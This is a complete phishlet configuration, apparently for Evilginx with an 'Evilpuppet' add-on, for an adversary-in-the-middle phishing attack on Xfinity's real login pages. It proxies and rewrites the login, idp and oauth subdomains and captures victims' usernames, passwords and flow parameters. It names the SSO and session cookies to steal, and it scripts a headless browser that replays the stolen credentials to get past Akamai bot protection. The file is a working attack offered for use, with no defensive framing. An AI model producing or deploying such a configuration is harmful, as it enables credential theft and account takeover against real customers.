min_ver: '3.0.0'

# Xfinity Phishlet with Evilpuppet for Akamai Bot Manager bypass
# January 2026 version

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'xfinity.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'idp', orig_sub: 'idp', domain: 'xfinity.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'oauth', orig_sub: 'oauth', domain: 'xfinity.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Comprehensive domain replacements
  - {triggers_on: 'xfinity.com', orig_sub: 'login', domain: 'xfinity.com', search: 'https://login.xfinity.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}
  - {triggers_on: 'xfinity.com', orig_sub: 'login', domain: 'xfinity.com', search: 'login.xfinity.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}
  - {triggers_on: 'xfinity.com', orig_sub: 'idp', domain: 'xfinity.com', search: 'https://idp.xfinity.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'text/css']}
  - {triggers_on: 'xfinity.com', orig_sub: 'idp', domain: 'xfinity.com', search: 'idp.xfinity.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'text/css']}
  - {triggers_on: 'xfinity.com', orig_sub: 'oauth', domain: 'xfinity.com', search: 'https://oauth.xfinity.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'xfinity.com', orig_sub: 'oauth', domain: 'xfinity.com', search: 'oauth.xfinity.com', replace: '{hostname}', mimes: ['text/html', 'application/json']}

auth_tokens:
  # Primary session tokens
  - domain: '.xfinity.com'
    keys: ['XFINITY-SSO', 'xsso', 'SC', 'bid', 'AMCV_*', 's_vi', 's_fid', 's_pers', 's_sess']
  # Akamai bot protection cookies (CRITICAL)
  - domain: '.xfinity.com'
    keys: ['_abck', 'bm_sz', 'ak_bmsc', 'AWSALB', 'AWSALBCORS', 'AWSALBTG', 'AWSALBTGCORS', 'OptanonConsent', 'OptanonAlertBoxClosed']
  # Additional session cookies
  - domain: '.login.xfinity.com'
    keys: ['JSESSIONID', 'session_token', 'suAKghhasg', 'gpv_Page', 's_sq']

credentials:
  # Username/Email capture
  username:
    key: 'user'
    search: '(.*)'
    type: 'post'
    page: '/login'
    
  # Password capture (this happens on the next step)
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
    page: '/login'
    
  # Capture all flow parameters for proper redirection
  custom:
    - key: 'flowId'
      search: '(.*)'
      type: 'post'
      page: '/login'
    - key: 'flowStateId'
      search: '(.*)'
      type: 'post'
      page: '/login'
    - key: 'reqId'
      search: '(.*)'
      type: 'post'
      page: '/login'
    - key: 'r'
      search: '(.*)'
      type: 'post'
      page: '/login'
    - key: 's'
      search: '(.*)'
      type: 'post'
      page: '/login'

# ============================================
# EVILPUPPET CONFIGURATION FOR AKAMAI BYPASS
# ============================================

evilpuppet:
  triggers:
    # Trigger 1: When user submits email (first step)
    - id: 'xfinity_email'
      enabled: true
      domains: ['login.xfinity.com']
      paths: ['/login']
      tokens: ['X-hzfdeCEGvt-a', 'X-hzfdeCEGvt-z', 'X-hzfdeCEGvt-d', 'X-hzfdeCEGvt-c', 'X-hzfdeCEGvt-b', 'X-hzfdeCEGvt-f']
      auto_activate: true
      open_url: 'https://login.xfinity.com/login'
      actions:
        # Wait for page to load
        - selector: 'body'
          click: false
          post_wait: 2000
        # Accept cookies if popup appears
        - selector: '#truste-consent-button, .accept-cookies, [aria-label="Accept Cookies"]'
          click: true
          post_wait: 1000
        # Enter the email that victim entered
        - selector: 'input[name="user"], #user, input[type="email"]'
          value: '{username}'
          enter: false
          click: false
          post_wait: 500
        # Click the submit/continue button
        - selector: 'button[type="submit"], #continue, .btn-primary, [data-testid="submit-button"]'
          click: true
          post_wait: 3000
        # Wait for password page to load
        - selector: 'input[name="passwd"], #passwd, input[type="password"]'
          click: false
          post_wait: 2000
      
    # Trigger 2: When user submits password (second step)
    - id: 'xfinity_password'
      enabled: true
      domains: ['login.xfinity.com']
      paths: ['/login']
      tokens: ['X-hzfdeCEGvt-a', 'X-hzfdeCEGvt-z', 'X-hzfdeCEGvt-d', 'X-hzfdeCEGvt-c', 'X-hzfdeCEGvt-b', 'X-hzfdeCEGvt-f']
      auto_activate: false
      open_url: ''
      actions:
        # We're already on password page from previous step
        # Enter the password that victim entered
        - selector: 'input[name="passwd"], #passwd, input[type="password"]'
          value: '{password}'
          enter: false
          click: false
          post_wait: 500
        # Check "Remember me" if present
        - selector: 'input[name="rememberMe"], #rememberMe, [type="checkbox"]'
          click: true
          post_wait: 500
        # Click the sign in button
        - selector: 'button[type="submit"], #sign_in, .sign-in-button'
          click: true
          post_wait: 5000

  interceptors:
    # Interceptor for email submission tokens
    - token: 'X-hzfdeCEGvt-a'
      url_re: '^https://login\.xfinity\.com/login.*'
      post_re: 'X-hzfdeCEGvt-a=([^&]*)'
      abort: true
    - token: 'X-hzfdeCEGvt-z'
      url_re: '^https://login\.xfinity\.com/login.*'
      post_re: 'X-hzfdeCEGvt-z=([^&]*)'
      abort: true
    - token: 'X-hzfdeCEGvt-d'
      url_re: '^https://login\.xfinity\.com/login.*'
      post_re: 'X-hzfdeCEGvt-d=([^&]*)'
      abort: true
    - token: 'X-hzfdeCEGvt-c'
      url_re: '^https://login\.xfinity\.com/login.*'
      post_re: 'X-hzfdeCEGvt-c=([^&]*)'
      abort: true
    - token: 'X-hzfdeCEGvt-b'
      url_re: '^https://login\.xfinity\.com/login.*'
      post_re: 'X-hzfdeCEGvt-b=([^&]*)'
      abort: true
    - token: 'X-hzfdeCEGvt-f'
      url_re: '^https://login\.xfinity\.com/login.*'
      post_re: 'X-hzfdeCEGvt-f=([^&]*)'
      abort: true
    
    # Also intercept the flow parameters
    - token: 'flowId'
      url_re: '^https://login\.xfinity\.com/login.*'
      post_re: 'flowId=([^&]*)'
      abort: false
    - token: 'flowStateId'
      url_re: '^https://login\.xfinity\.com/login.*'
      post_re: 'flowStateId=([^&]*)'
      abort: false
    - token: 'flowStep'
      url_re: '^https://login\.xfinity\.com/login.*'
      post_re: 'flowStep=([^&]*)'
      abort: false

# ============================================
# FORCE POST CONFIGURATION (COMPLEMENTARY)
# ============================================

force_post:
  # First POST (email submission)
  - path: /login
    search:
      - {key: 'flowStep', search: 'username'}
    force:
      - {key: 'X-hzfdeCEGvt-a', value: 'pass'}
      - {key: 'X-hzfdeCEGvt-z', value: 'pass'}
      - {key: 'X-hzfdeCEGvt-d', value: 'pass'}
      - {key: 'X-hzfdeCEGvt-c', value: 'pass'}
      - {key: 'X-hzfdeCEGvt-b', value: 'pass'}
      - {key: 'X-hzfdeCEGvt-f', value: 'pass'}
      - {key: 'userVerifyingPlatformAuthenticatorAvailable', value: 'pass'}
      - {key: 'r', value: 'pass'}
      - {key: 's', value: 'pass'}
    type: 'post'
  
  # Second POST (password submission)
  - path: /login
    search:
      - {key: 'flowStep', search: 'password'}
    force:
      - {key: 'X-hzfdeCEGvt-a', value: 'pass'}
      - {key: 'X-hzfdeCEGvt-z', value: 'pass'}
      - {key: 'X-hzfdeCEGvt-d', value: 'pass'}
      - {key: 'X-hzfdeCEGvt-c', value: 'pass'}
      - {key: 'X-hzfdeCEGvt-b', value: 'pass'}
      - {key: 'X-hzfdeCEGvt-f', value: 'pass'}
      - {key: 'userVerifyingPlatformAuthenticatorAvailable', value: 'pass'}
      - {key: 'rememberMe', value: 'pass'}
    type: 'post'

# ============================================
# LOGIN DETECTION
# ============================================

login:
  domain: 'login.xfinity.com'
  path: '/login'
  detect:
    - selector: 'form[action*="/login"] input[name="passwd"]'
      type: 'visible'
  redirect:
    - url: 'https://www.xfinity.com'
      conditional: true

# ============================================
# HEADERS CONFIGURATION
# ============================================

headers:
  remove:
    - 'X-Forwarded-For'
    - 'X-Real-IP'
  add:
    - 'X-Forwarded-Proto: https'
    - 'Sec-Fetch-Dest: document'
    - 'Sec-Fetch-Mode: navigate'
    - 'Sec-Fetch-Site: same-origin'
    - 'Sec-Fetch-User: ?1'